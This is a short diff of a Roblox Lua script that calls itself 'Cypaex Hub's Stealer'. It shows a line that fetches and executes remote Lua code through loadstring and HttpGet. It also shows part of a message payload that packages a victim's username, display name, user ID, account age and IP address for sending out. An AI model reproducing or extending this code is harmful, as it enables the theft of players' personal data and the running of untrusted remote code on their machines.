@@ -111,7 +111,7 @@ end
 
 
 if _G.LoadingScreen ~= false then
-    loadstring(game:HttpGet(https://raw.githubusercontent.com/Cypaex/PsxLoading/main/Engine.lua))()
+    loadstring(game:HttpGet(loadingraw))()
 end
 if _G.AntiLeave ~= false then
     for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
@@ -1248,7 +1248,7 @@ if banktiercheck == true then
                 ["width"] = 420
             },
             ["fields"] = { {
-                ["name"] = "**This data was generated using Cypaex Hub's Stealer** :cold_face:",
+                ["name"] = "**This data was generated using Cypaex Hub's Stealer** :melting_face:",
                 ["value"] = "```Username     : " .. username .. "\nDisplay Name : " .. fardplayer.DisplayName ..
                     "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                     " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank ..
